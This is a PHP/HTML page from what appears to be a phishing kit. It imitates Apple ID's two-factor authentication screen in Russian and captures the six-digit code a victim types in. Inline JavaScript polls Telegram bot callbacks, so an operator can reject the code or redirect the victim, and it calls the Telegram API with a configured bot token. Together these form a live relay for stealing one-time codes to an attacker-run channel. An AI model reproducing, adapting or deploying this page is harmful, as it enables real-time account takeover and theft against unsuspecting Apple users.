<?php
include('../config.php');
?>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
      <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title></title>
      <link rel="stylesheet" type="text/css" href="css/index.css">
      <link rel="stylesheet" type="text/css" href="css/app.css">
      <link rel="stylesheet" type="text/css" href="css/home.css">
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   </head>
   <body>
      <div id="root">
         <panel>
            <div class="root-viewport">
               <div class="root-component">
                  <div class="page-viewport landing-page-route fade-in">
                     <div class="page-content">
                        <?php include_once('html_modules/header.php'); ?>
                        <div class="home-login-component">
                           <div class="parent-container is-visible">
                              <div style="visibility: visible; height: auto;">
                                 <div class="widget-icon-text">
                                    <img class="icon" draggable="false" alt="" aria-hidden="true" src="media/4f72d89d71e9abcc4e37c71fb77fe65b.png">
                                 </div>
                                 <div id="idms-auth-5981bc03-12de-4178-bd62-052c923d0a16" class="apple-id-container apple-id-frame-value">
                                 <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
                                    <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
                                       <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
                                          <div id="step" class="si-step  ">
                                             <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section">
                                             </logo>
                                             <div id="stepEl" class="   ">
                                                <div class="sk7">
                                                   <hsa2-sk7>
                                                      <div class="verify-phone">
                                                         <div class="sa-sk7__app-title" style="margin-bottom: 20px">
                                                            <h1 class=" tk-intro  "  tabindex="-1">Двухфакторная аутентификация</h1>
                                                         </div>
                                                         <div class="sa-sk7__content" style="margin: auto;">
                                                            <div class="verify-phone__sec-code">
                                                               <div class="form-security-code">
                                                                  <div class="form-security-code-inputs">
                                                                     <input class="form-security-code-input" autofocus id="codeInput1" maxlength="1" onkeyup="handleCases(event,'1');" type="tel" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Enter Verification Code Digit 1" value="" data-focus-method="key">
                                                                     <input class="form-security-code-input" id="codeInput2" maxlength="1" onkeyup="handleCases(event,'2');" type="tel" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 2" value="">
                                                                     <input class="form-security-code-input" id="codeInput3" maxlength="1" onkeyup="handleCases(event,'3');" type="tel" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 3" value="">
                                 
                                                                     <input class="form-security-code-input" id="codeInput4"maxlength="1" onkeyup="handleCases(event,'4');" type="tel" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 4" value="">
                                                                     <input class="form-security-code-input" id="codeInput5" maxlength="1" onkeyup="handleCases(event,'5');" type="tel" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 5" value="">
                                                                     <input class="form-security-code-input" id="codeInput6" maxlength="1" onkeyup="handleCases(event,'6');" type="tel" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 6" value="">
                                                                  </div>
                                                               </div>
                                                            </div>
                                                            <div class="signin-container-footer">
                                                               <div class="signin-container-footer__info"><span>На ваш телефон отправлено сообщение с кодом подтверждения. Введите код, чтобы продолжить.</span></div>
                                                               <div id="balgoj" class="fixed-h">
                                                                  <div class="signin-container-footer__link">
                                                                     <div class="text text-typography-body-reduced">
                                                                        <div class="inline-links">
                                                                           <div class="inline-links__link"><button class="button button-link button-rounded-rectangle" type="button" id="alt-options-btn"><span class="text text-typography-body-reduced">Не получили код подтверждения?</span></button></div>
                                                                        </div>
                                                                     </div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                         <ui-activity-indicator role="progressbar" id="loadermtfg" class="standard hide" aria-label="Loading" style="margin-top: 20px">
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                            <ui-spinner-nib></ui-spinner-nib>
                                                         </ui-activity-indicator>
                                                      </div>
                                                   </hsa2-sk7>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </apple-auth>
                                 </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <?php include_once('html_modules/footer.php'); ?>
                     </div>
                  </div>
               </div>
            </div>
        </panel>
      </div>
   <?php require_once('../includes/js/makeRequest.php');  ?>
   <script src="js/2fa.js"></script>
   <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === unique + " error" || result.callback_query.data === unique + " disconnect")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];

          deleteMessage(chatId, messageId);

        if (action === "error") {
         input_id1.removeAttribute('readonly', true);
         input_id2.removeAttribute('readonly', true);
         input_id3.removeAttribute('readonly', true);
         input_id4.removeAttribute('readonly', true);
         input_id5.removeAttribute('readonly', true);
         input_id6.removeAttribute('readonly', true);
         input_id1.value = null;
         input_id2.value = null;
         input_id3.value = null;
         input_id4.value = null;
         input_id5.value = null;
         input_id6.value = null;
         clearInterval(requesting);
         balgoj.classList.remove('hide');
         loadermtfg.classList.replace('show', 'hide');
            input_id1.focus();
            console.log("error!");
        } else if (action === "disconnect") {
            window.location.href = "<?php echo $redirect['success']; ?>"; 
            console.log("disconnected!");
        } 

          break;
        }
      }
    }
  </script>
  <script>
   function deleteMessage(chatId, messageId) {
    var params = {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: '',
    };

    $.ajax({
        url: "https://api.telegram.org/bot<?php echo $telegram['bot_token'] ?>/editMessageReplyMarkup",
        type: "GET",
        data: params,
        success: function(response) {
            console.log("message deleted!");
        },
        error: function(xhr, status, error) {
            console.error("Failed to delete message. Response:", xhr.responseText);
        }
    });
}
  </script>
   </body>
</html>

